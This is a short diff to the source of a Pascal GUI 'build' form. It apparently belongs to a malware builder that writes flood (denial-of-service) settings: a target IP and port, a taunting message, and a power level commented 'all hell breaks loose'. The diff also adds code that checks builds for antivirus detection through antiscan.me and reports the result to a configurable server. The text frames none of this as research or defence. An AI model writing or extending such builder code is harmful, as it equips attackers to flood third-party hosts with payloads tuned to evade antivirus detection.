@@ -16,6 +16,8 @@ type
   TBuildForm = class(TForm)
     ClearButton: TBCButton;
     AddFileButton: TBCButton;
+    AboutImage: TImage;
+    Label1: TLabel;
     SelectFile: TOpenDialog;
     RemFileButton: TBCButton;
     BackShape1: TShape;
@@ -234,7 +236,7 @@ Begin
       WriteString('Flood', 'DefaultIP', '1.1.1.1');
       WriteInteger('Flood', 'DefaultPort', 80);
       WriteString('Flood', 'Message', 'My dreaming ends... Your nightmare begins!');
-      WriteInteger('Flood', 'MaxPower', 1);
+      WriteInteger('Flood', 'MaxPower', 1); // 1 = ... all hell breaks loose
 
       SCast:=TStringList.Create;
       GetStrings(SCast);
@@ -681,7 +683,8 @@ begin
   S:='';
   OpenURL('https://antiscan.me/');
   if InputQuery('Scan', 'Please enter the result code!', S) then Begin
-
+    S:=Hat.Get(Settings.ReadString('General', 'Server', 'http://localhost')+'/detect.php?id='+S);
+    ShowMessage('The server says: '+S);
   end;
 end;
 
